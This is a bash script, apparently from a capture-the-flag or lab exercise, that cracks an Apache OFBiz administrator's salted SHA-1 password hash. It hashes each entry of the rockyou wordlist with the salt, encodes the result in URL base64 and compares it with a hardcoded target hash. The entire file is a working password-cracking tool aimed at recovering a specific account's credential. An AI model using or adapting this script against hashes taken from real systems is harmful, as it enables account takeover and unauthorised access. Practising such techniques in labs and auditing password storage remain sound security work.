#!/bin/bash

TARGET_PASSWORD_HASH='$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I'
TARGET_SHA1SUM_BASE64='uP0_QaVBpDWFeo8-dRzDqRwXQ2I='
input="/opt/useful/rockyou.txt"
count=0
SALT='d'

#reading each password from file
while IFS= read -r OFBIZ_ADMIN_PASSWORD
do

  # Take a SHA-1 hash of the combined salt and password and strip off any additional output form the sha1sum utility.
  #SHA1SUM_ASCII_HEX=$(printf "$SALT_AND_PASSWORD" | sha1sum | cut --delimiter=' ' --fields=1 --zero-terminated | tr --delete '\000')
  SHA1SUM_ASCII_HEX=$(printf "${SALT}${OFBIZ_ADMIN_PASSWORD}" | sha1sum | cut --delimiter=' ' --fields=1 --zero-terminated | tr --delete '\000')

  # Convert the ASCII Hex representation of the hash to raw bytes by inserting escape sequences and running
  # through the printf command. Encode the result as URL base 64 and remove padding.
  SHA1SUM_ESCAPED_STRING=$(printf "$SHA1SUM_ASCII_HEX" | sed -e 's/\(..\)\.\?/\\x\1/g')

  SHA1SUM_BASE64=$(printf "$SHA1SUM_ESCAPED_STRING" | base64url --wrap=0)

  # echo $SHA1SUM_BASE64

  # Concatenate the hash type, salt and hash as the encoded password value.
  # ENCODED_PASSWORD_HASH="\$SHA\$${SALT}\$${SHA1SUM_BASE64}"


  echo "count: $count"
  # echo $TARGET_SHA1SUM_BASE64
  # echo $SHA1SUM_BASE64

  count=$((count+1))
  
  if [ "$TARGET_SHA1SUM_BASE64" = "$SHA1SUM_BASE64" ]; then
    echo "Strings are equal!"
    break;
  else
    echo ""
  fi
done < "$input"
